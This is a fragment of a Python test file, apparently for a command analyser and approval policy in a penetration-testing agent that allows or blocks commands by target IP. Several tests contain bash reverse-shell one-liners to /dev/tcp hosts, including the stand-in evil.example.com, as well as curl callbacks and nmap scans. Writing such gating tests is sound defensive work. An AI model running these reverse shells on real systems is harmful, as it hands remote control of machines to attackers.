...
def test_egress_to_allowlisted_ip_allowed():
    a = analyze_command("curl http://192.168.1.5/callback", locked_ip="10.0.0.50",
                        allowed_targets=["192.168.1.5"])
    assert a.allowed is True, a.reasons


def test_egress_to_cidr_allowlist_allowed():
    a = analyze_command("nmap 10.0.0.20", locked_ip="10.0.0.50",
...
def test_reverse_shell_to_allowlisted_ip_allowed():
    a = analyze_command("bash -i >& /dev/tcp/192.168.1.5/4444 0>&1",
                        locked_ip="10.0.0.50", allowed_targets=["192.168.1.5"])
...
def test_reverse_shell_to_hostname_blocked():
    ...
    a = analyze_command("bash -i >& /dev/tcp/evil.example.com/4444 0>&1",
                        locked_ip="10.0.0.50")
    assert a.allowed is False
    assert a.reverse_shell is True
...
def test_python_subprocess_to_target_not_destructive():
    ...
    a = analyze_command(
        ...
        language="python", locked_ip="10.0.0.50",
    )
...
async def test_policy_auto_approves_reverse_shell_in_full_access(tmp_path: Path):
    ...
    approved = await policy.approve_action(
        "run_exploit_terminal", "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1"
    )
    assert approved is True
